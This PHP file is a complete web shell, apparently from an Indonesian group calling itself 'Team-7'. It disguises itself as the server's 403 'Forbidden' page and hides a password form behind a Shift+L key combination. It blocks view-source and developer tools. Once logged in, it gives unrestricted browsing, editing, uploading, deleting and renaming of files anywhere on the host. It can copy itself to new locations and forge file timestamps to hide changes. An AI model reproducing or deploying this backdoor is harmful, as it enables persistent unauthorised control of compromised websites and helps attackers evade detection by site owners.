<?php
session_start();
date_default_timezone_set("Asia/Jakarta");
function show_login_page($message = "")
{
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <script src="/fold-sighnesse-double-our-Colour-fromisdome-Cloc" async></script>
        <title><?= $_SERVER['SERVER_NAME']; ?></title>
    </head>
    <body>
        <h1>Forbidden</h1>
        <h1 style="font-weight: normal; font-size: 18px;">You don't have permission to access this resource.</h1>
        <hr>
        <?php
$server = $_SERVER['SERVER_SOFTWARE'];
$host = $_SERVER['SERVER_NAME'];
$port = $_SERVER['SERVER_PORT'];

$os = php_uname('s');
$release = php_uname('r');
if (stripos($server, 'apache') !== false) {
    $distro = "(Linux)";
    if (file_exists('/etc/debian_version')) {
        $distro = "(Debian)";
    } elseif (file_exists('/etc/redhat-release')) {
        $distro = "(RedHat)";
    }
    echo "<i>Apache" . explode(" ", $server)[0] . " $distro Server at $host Port $port</i>";
} elseif (stripos($server, 'nginx') !== false) {
    echo "<i>$server (Linux) Server at $host Port $port</i>";
} elseif (stripos($server, 'microsoft-iis') !== false) {
    echo "<i>$server (Windows) Server at $host Port $port</i>";
} else {
    echo "<i>$server ($os) Server at $host Port $port</i>";
}
?>
<form action="" method="post" style="display:none;position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background-color:#C0C0C0;padding:20px;border:2px groove #888;box-shadow:3px 3px 8px #999;font-family:Tahoma;width:280px;text-align:center;"><div style="margin-bottom:10px;font-weight:bold;font-size:14px;color:black;">🔐 Enter Password</div><input type="password" name="pass" placeholder="Password" autofocus style="width:90%;padding:6px;font-size:13px;border:2px inset #999;background-color:#fff;margin-bottom:12px;font-family:Tahoma;"><br><input type="submit" name="submit" value="Login" style="padding:6px 20px;background-color:#C0C0C0;color:black;border:2px outset #999;font-weight:bold;cursor:pointer;font-family:Tahoma;font-size:13px;"></form>
        <script type="text/javascript">
            document.addEventListener('contextmenu', function(e) {
                e.preventDefault();
            }, false);

            document.addEventListener('keydown', function(e) {
                if (e.ctrlKey && (e.key === 'u' || e.key === 'U')) {
                    e.preventDefault();
                }
                if (e.ctrlKey && e.shiftKey && (e.key === 'i' || e.key === 'I')) {
                    e.preventDefault();
                }
                if (e.ctrlKey && (e.key === 's' || e.key === 'S')) {
                    e.preventDefault();
                }
                if (e.ctrlKey && (e.key === 'a' || e.key === 'A')) {
                    e.preventDefault();
                }
                if (e.key === 'F12') {
                    e.preventDefault();
                }
            }, false);

            document.addEventListener('keydown', function(e) {
                if (e.shiftKey && e.key === 'L') {
                    e.preventDefault();
                    var form = document.querySelector('form');
                    form.style.display = 'block';
                    var passwordInput = document.querySelector('form input[type="password"]');
                    passwordInput.focus();
                }
            }, false);
        </script>
    </body>
    </html>
    <?php
    exit;
}
if (isset($_GET['logout'])) {
    session_unset();
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit();
}
if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$a1K97JAkJsMzE/YpDkcYYOvJ4TEB7B99pXIYj5/H0E8EAamXznnOW'; // Hash password
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
        $_SESSION['FM_SESSION_ID']['password_plaintext'] = $_POST['pass'];
    } else {show_login_page("Password salah");}}
function openGateway() {
    echo '<pre>';
    echo 'Anda sudah login!';
    echo '</pre>';
}
?>
<?php
error_reporting(0);
$cwd = getcwd();
$path = isset($_GET['path']) ? $_GET['path'] : $cwd;
$path = realpath($path);
$msg = '';
$notif = '';
$showRename = false;
$renameTarget = '';
if (isset($_GET['rename'])) {
    $showRename = true;
    $renameTarget = $_GET['rename'];
}
if (isset($_POST['do_backup']) && !empty($_POST['backup_name'])) {
    $src = $_SERVER['SCRIPT_FILENAME'];
    $real_path = realpath($path);
    $backupName = preg_replace('/[^a-zA-Z0-9_\-\.]/', '_', $_POST['backup_name']);
    $dst = $real_path . '/' . basename($backupName);
    if (copy($src, $dst)) {
        $notif = '<div class="notif success">Backup saved as: ' . htmlspecialchars($backupName) . '</div>';
    } else {
        $notif = '<div class="notif fail">Failed to create backup file.</div>';
    }
}
if (isset($_POST['do_rename']) && isset($_POST['oldname']) && isset($_POST['newname'])) {
    $old = $_POST['oldname'];
    $new = dirname($old) . '/' . $_POST['newname'];
    if (rename($old, $new)) {
        $notif = '<div class="notif success"> File renamed successfully.</div>';
    } else {
        $notif = '<div class="notif fail">Failed to rename file.</div>';
    }
    $showRename = false;
}
if (isset($_POST['do_delete']) && !empty($_POST['del_target'])) {
    $target = $_POST['del_target'];
    $res = is_dir($target) ? rmdir($target) : unlink($target);
    $notif = $res
        ? '<div class="notif success"> Deleted successfully.</div>'
        : '<div class="notif fail"> Delete failed.</div>';
}

if (isset($_GET['edit'])) {
    $file = $_GET['edit'];
    if (isset($_POST['save'])) {
        $fp = fopen($file, 'w');
        $w = fwrite($fp, $_POST['content']);
        fclose($fp);
        $notif = $w !== false ? '<div class="notif success"> File saved successfully.</div>' : '<div class="notif fail">Failed to save file.</div>';
    }
    $contents = file_get_contents($file);
}
if (isset($_GET['upload']) && isset($_FILES['upfile'])) {
    $target = $path . '/' . basename($_FILES['upfile']['name']);
    $res = move_uploaded_file($_FILES['upfile']['tmp_name'], $target);
    $notif = $res ? '<div class="notif success"> File uploaded successfully.</div>' : '<div class="notif fail">Upload failed.</div>';
}
if (isset($_GET['make']) && isset($_POST['name']) && isset($_POST['action'])) {
    $target = $path . '/' . $_POST['name'];
    if ($_POST['action'] == 'file' && !file_exists($target)) {
        $f = fopen($target, 'w');
        $res = fclose($f);
    } elseif ($_POST['action'] == 'folder' && !file_exists($target)) {
        $res = mkdir($target);
    }
    $notif = $res ? '<div class="notif success"> Created successfully.</div>' : '<div class="notif fail">Failed to create.</div>';
}

if (isset($_POST['do_touch']) && !empty($_POST['touch_target']) && !empty($_POST['touch_date'])) {
    $target = $_POST['touch_target'];
    $tanggal = $_POST['touch_date'];
    $ts = strtotime($tanggal);

    if ($ts !== false && file_exists($target)) {
        if (touch($target, $ts)) {
            $notif = "<div class='notif success'> Timestamp <b>" . basename($target) . "</b> telah diubah ke <code>$tanggal</code>.</div>";
        } else {
            $notif = "<div class='notif fail'> Gagal mengubah timestamp file.</div>";
        }
    } else {
        $notif = "<div class='notif fail'> Format tanggal salah atau file tidak ditemukan.</div>";
    }
}
function getPermStr($f) {
  $p = fileperms($f);
  $s = ($p & 0x4000) ? 'd' : '-';
  $perm = $s .
      (($p & 0x0100) ? 'r' : '-') .
      (($p & 0x0080) ? 'w' : '-') .
      (($p & 0x0040) ? 'x' : '-') .
      (($p & 0x0020) ? 'r' : '-') .
      (($p & 0x0010) ? 'w' : '-') .
      (($p & 0x0008) ? 'x' : '-') .
      (($p & 0x0004) ? 'r' : '-') .
      (($p & 0x0002) ? 'w' : '-') .
      (($p & 0x0001) ? 'x' : '-');

  if (is_writable($f)) {
      $color = '#00bd09ff'; 
  } elseif (is_readable($f)) {
      $color = '#c5c5c5'; 
  } else {
      $color = '#ff1100ff'; 
  }
  return "<span class='status-label' style='color:$color;'>$perm</span>";
}

$files = scandir($path);
$folders = array();
$otherfiles = array();
foreach ($files as $f) {
    if ($f == '.') continue;
    $full = $path . '/' . $f;
    if (is_dir($full)) {
        $folders[] = $f;
    } else {
        $otherfiles[] = $f;
    }
}
$parts = explode('/', trim($path, '/'));
$build = '';
$breadcrumb = '';
foreach ($parts as $p) {
    $build .= '/' . $p;
    $breadcrumb .= '<a href="?path=' . urlencode($build) . '" style="color:#fff">' . htmlspecialchars($p) . '</a>/';
}
?>
<html>
<head>
<title>Team-7</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
<!-- Tambahan mode HTMLmixed -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/htmlmixed/htmlmixed.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/css/css.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/clike/clike.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/php/php.min.js"></script>
<style>
body { background-color:#C0C0C0; font-family:Tahoma; }
.container { width:1000px; margin:20px auto; }
.table-scroll { max-height: 400px; overflow-y: auto; border: 1px solid #333; background:white; }
table { width:100%; border-collapse:collapse; }
table tr:hover {background-color: #f0f8ff;cursor: pointer;}
th, td { border:1px solid #666; padding:5px; font-size:13px; }
th { background:#00008B; color:#fff; position:sticky; top:0; }
a { text-decoration:none; color:#00008B; }
.breadcrumb { background:#00008B; padding:8px 12px; margin-bottom:8px; font-size:13px; border:1px solid #888; color:#fff; }
.breadcrumb a { color: #fff; }
.notif { width:975px; margin:10px auto; padding:5px; font-size:14px; font-weight:bold; text-align:left; }
.success { background:#cfc; border:1px solid #090; color:#060; }
.fail { background:#fcc; border:1px solid #900; color:#900; }
form.actionform { display:inline; }
.action-box { display:flex; justify-content:space-between; align-items:center; background-color:#C0C0C0; padding:5px; border:2px solid #888; margin-top:5px; }
form.uploadform, form.createform { margin:10px; }
form.uploadform input, form.createform input, form.createform select { font-size:12px; }
.logo-box img { height:100px; }
.popup-notif {position: fixed;top: 20px;right: 20px;z-index: 9999;padding: 10px 18px;font-size: 14px;font-family: Tahoma;font-weight: bold;border-radius: 5px;box-shadow: 0 0 8px rgba(0,0,0,0.4);min-width: 240px;text-align: left;}
.success {background: #cfc;border: 1px solid #090;color: #060;}
.fail {background: #fcc;border: 1px solid #900;color: #900;}
.tombol-neirra {background: #e0e0e0;padding: 4px 10px;border: 2px outset #999;color: #00008B;text-decoration: none;font-weight: bold;font-family: Tahoma;font-size: 13px;display: inline-block;}
.status-label {
  font-family: monospace;
  font-weight: bold;}
</style>
</head>
<body>
<div class="container">
<table style="border-collapse:collapse; width:100%;">
<tr>
    <th colspan="5" style="background:#00008B; color:white; padding:8px; font-family:Tahoma; font-size:14px; text-align:left; border:2px groove #666;">
        <i class="fa fa-terminal"></i> 2007
    </th>
</tr>
<tr>
    <td colspan="5" class="breadcrumb" style="background:#00008B; color:white; padding:6px 10px; font-family:Tahoma; font-size:13px; border-left:2px groove #666; border-right:2px groove #666; border-bottom:2px groove #666;">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <div>
                <i class="fa fa-folder-open"></i> <strong>Path:</strong> 
                <a href="?path=/" style="color:#fff; font-weight:bold;">/</a><?php echo $breadcrumb; ?>
            </div>
            <div>
                <a href="?path=<?php echo urlencode($path); ?>&backup=1" 
                    style="background:#e0e0e0; padding:4px 10px; border:2px outset #999; color:#00008B; text-decoration:none; font-weight:bold; font-family:Tahoma; font-size:13px;">
                    <i class="fa fa-archive"></i> Backup Shell
                </a>
                <a href="?path=<?php echo urlencode(dirname(__FILE__)); ?>" 
                   style="background:#e0e0e0; padding:4px 10px; border:2px outset #999; color:#00008B; text-decoration:none; font-weight:bold; font-family:Tahoma; font-size:13px;">
                    <i class="fa fa-home"></i> Home File
                </a>
            </div>
        </div>
    </td>
</tr>
</table>
<?php if (!empty($notif)) : ?>
    <script>
  setTimeout(function() {
    var notif = document.querySelector('.popup-notif');
    if (notif) {
      notif.style.transition = 'opacity 0.5s ease';
      notif.style.opacity = 0;
      setTimeout(function() {
        notif.remove();
      }, 500);
    }
  }, 5000);
</script>
  <div class="popup-notif <?php echo strpos($notif, 'success') !== false ? 'success' : 'fail'; ?>">
    <?php echo strip_tags($notif); ?>
  </div>
<?php endif; ?>
<?php if (isset($_GET['edit']) && isset($contents)) : ?>
<div class="notif" style="background:white; border:2px groove #999; padding:10px; font-family:Tahoma; font-size:13px;">
    <form method="post">
        <div style="font-weight:bold; margin-bottom:6px;">
            <i class="fa fa-edit"></i> Editing: <?php echo basename($file); ?>
        </div>
        <textarea id="editor" name="content"><?php echo htmlspecialchars($contents); ?></textarea><br><br>
        <button type="submit" name="save" class="tombol-neirra"><i class="fa fa-save"></i> Save</button>
        <a href="?path=<?php echo urlencode(dirname($file)); ?>" class="tombol-neirra" style="margin-left:10px;"><i class="fa fa-times"></i> Cancel</a>
    </form>
</div>
<script>
// Fungsi untuk menentukan mode berdasarkan ekstensi file
function getModeByExtension(filename) {
  var ext = filename.split('.').pop().toLowerCase();
  switch (ext) {
    case 'php':
    case 'phtml':
      return 'htmlmixed';
    case 'html':
    case 'htm':
    case 'xhtml':
      return 'htmlmixed';
    case 'css':
      return 'css';
    case 'js':
      return 'javascript';
    case 'json':
      return 'application/json';
    case 'xml':
      return 'xml';
    case 'c':
    case 'cpp':
      return 'text/x-c++src';
    case 'java':
      return 'text/x-java';
    case 'py':
      return 'python';
    default:
      return 'text/plain';
  }
}

// Ambil nama file dari PHP (lewat echo)
var filename = "<?php echo basename($file); ?>";

// Inisialisasi editor CodeMirror
var editor = CodeMirror.fromTextArea(document.getElementById("editor"), {
    lineNumbers: true,
    mode: getModeByExtension(filename), // mode ditentukan otomatis
    theme: "ayu-mirage",
    indentUnit: 4,
    smartIndent: true,
    tabSize: 4,
    lineWrapping: true,
    matchBrackets: true
});
editor.setSize("100%", "500px");
</script>
<?php endif; ?>
<?php if (isset($_GET['backup'])): ?>
<div class="notif" style="background:white; border:2px groove #999; padding:10px;">
    <form method="post" style="font-family:Tahoma; font-size:13px;">
        <i class="fa fa-archive"></i> Backup Shell as: 
        <input type="text" name="backup_name" placeholder="example.php" style="padding:4px; border:2px inset #ccc;" required>
        <button type="submit" name="do_backup" class="tombol-neirra">
            <i class="fa fa-save"></i> Save
        </button>
        <a href="?path=<?php echo urlencode($path); ?>" class="tombol-neirra" style="margin-left:10px;">
            <i class="fa fa-times"></i> Cancel
        </a>
    </form>
</div>
<?php endif; ?>
<?php if ($showRename): ?>
<div class="notif" style="background:white; border:2px groove #999; padding:10px;">
    <form method="post" style="font-family:Tahoma; font-size:13px;">
        <i class="fa fa-edit"></i> Rename: <b><?php echo basename($renameTarget); ?></b> →
        <input type="text" name="newname" value="<?php echo basename($renameTarget); ?>" style="padding:4px; border:2px inset #ccc;">
        <input type="hidden" name="oldname" value="<?php echo $renameTarget; ?>">
        <button type="submit" name="do_rename" class="tombol-neirra">
        <i class="fa fa-edit"></i> Rename</button>
        <a href="?path=<?php echo urlencode($path); ?>" class="tombol-neirra" style="margin-left: 10px;"><i class="fa fa-times"></i> Cancel</a>
    </form>
</div>
<?php endif; ?>
<?php if (isset($_GET['touch'])) : ?>
<div class="notif" style="background:white; border:2px groove #999; padding:10px; font-family:Tahoma; font-size:13px;">
    <form method="post">
        <i class="fa fa-refresh"></i> Touch: <b><?php echo basename($_GET['touch']); ?></b><br><br>

        <label for="touch_date">Masukkan Tanggal & Waktu (YYYY-MM-DD HH:MM):</label><br>
        <input type="text" id="touch_date" name="touch_date" value="<?php echo date('Y-m-d H:i'); ?>" 
               style="padding:4px; border:2px inset #ccc; font-family:monospace;"><br><br>

        <input type="hidden" name="touch_target" value="<?php echo htmlspecialchars($_GET['touch']); ?>">

        <button type="submit" name="do_touch" class="tombol-neirra">
            <i class="fa fa-refresh"></i> Apply Touch
        </button>

        <a href="?path=<?php echo urlencode($path); ?>" class="tombol-neirra">
            <i class="fa fa-arrow-left"></i> Cancel
        </a>
    </form>
</div>
<?php endif; ?>
<?php if (!isset($_GET['edit'])): ?>
<!-- TABEL FILE DAN FOLDER -->
<div class="table-scroll">
<table>
<tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Permissions</th><th>Actions</th></tr>
<?php
foreach ($folders as $f) {
    $full = $path . '/' . $f;
    echo '<tr>';
    echo '<td><i class="fa fa-folder"></i> <a href="?path=' . urlencode($full) . '">' . htmlspecialchars($f) . '</a></td>';
    echo '<td>Folder</td>';
    echo '<td>-</td>';
    echo '<td>' . date("Y-m-d H:i", filemtime($full)) . '</td>';
    echo '<td>' . getPermStr($full) . '</td>';
    echo '<td>
    <a href="?rename=' . urlencode($full) . '"><i class="fa fa-edit"></i></a> ';
    echo '<form method="post" onsubmit="return confirm(\'Yakin ingin menghapus ' . addslashes(basename($full)) . '?\');" style="display:inline;">
        <input type="hidden" name="del_target" value="' . htmlspecialchars($full) . '">
        <button type="submit" name="do_delete" style="background:none;border:none;color:red;cursor:pointer;">
            <i class="fa fa-trash"></i>
        </button>
    </form> ';
    echo '<a href="?touch=' . urlencode($full) . '"><i class="fa fa-refresh"></i></a>
    </td>';
    echo '</tr>';
}

foreach ($otherfiles as $f) {
    $full = $path . '/' . $f;
    echo '<tr>';
    echo '<td><i class="fa fa-file-text"></i> <a href="?edit=' . urlencode($full) . '">' . htmlspecialchars($f) . '</a></td>';
    echo '<td>File</td>';
    echo '<td>' . filesize($full) . '</td>';
    echo '<td>' . date("Y-m-d H:i", filemtime($full)) . '</td>';
    echo '<td>' . getPermStr($full) . '</td>';
    echo '<td>
    <a href="?rename=' . urlencode($full) . '"><i class="fa fa-edit"></i></a> ';
    echo '<form method="post" onsubmit="return confirm(\'Yakin ingin menghapus ' . addslashes(basename($full)) . '?\');" style="display:inline;">
        <input type="hidden" name="del_target" value="' . htmlspecialchars($full) . '">
        <button type="submit" name="do_delete" style="background:none;border:none;color:red;cursor:pointer;">
            <i class="fa fa-trash"></i>
        </button>
    </form> ';
    echo '<a href="?touch=' . urlencode($full) . '"><i class="fa fa-refresh"></i></a>
    </td>';
    echo '</tr>';
}
?>
</table>
</div>
<?php endif; ?>
<div class="action-box">
    <div>
        <form class="uploadform" method="post" enctype="multipart/form-data" action="?upload=1&path=<?php echo urlencode($path); ?>" style="margin-bottom:6px; background:#e0e0e0; padding:6px 10px; border:2px groove #999;">
            <label style="font-family:Tahoma; font-size:13px;"><i class="fa fa-upload"></i> Upload:</label>
            <input type="file" name="upfile" style="border:2px inset #ccc; background:white; padding:4px;">
            <input type="submit" value="Upload" style="padding:5px 12px; background:#C0C0C0; border:2px outset #999; font-weight:bold; font-family:Tahoma;">
        </form>

        <form class="createform" method="post" action="?make=1&path=<?php echo urlencode($path); ?>" style="background:#e0e0e0; padding:6px 10px; border:2px groove #999;">
            <label style="font-family:Tahoma; font-size:13px;"><i class="fa fa-plus"></i> Create:</label>
            <select name="action" style="border:2px inset #ccc; background:white; font-family:Tahoma; font-size:13px;">
                <option value="file">File</option>
                <option value="folder">Folder</option>
            </select>
            <input type="text" name="name" style="border:2px inset #ccc; background:white; padding:4px;">
            <input type="submit" value="Create" style="padding:5px 12px; background:#C0C0C0; border:2px outset #999; font-weight:bold; font-family:Tahoma;">
        </form>
    </div>
    <div class="logo-box">
        <img src="https://raw.githubusercontent.com/santanamichigan/imunifychallenger/refs/heads/main/3d.gif" alt="Team-7" style="height:100px;">
    </div>
</div>
</div>
</body>
</html>
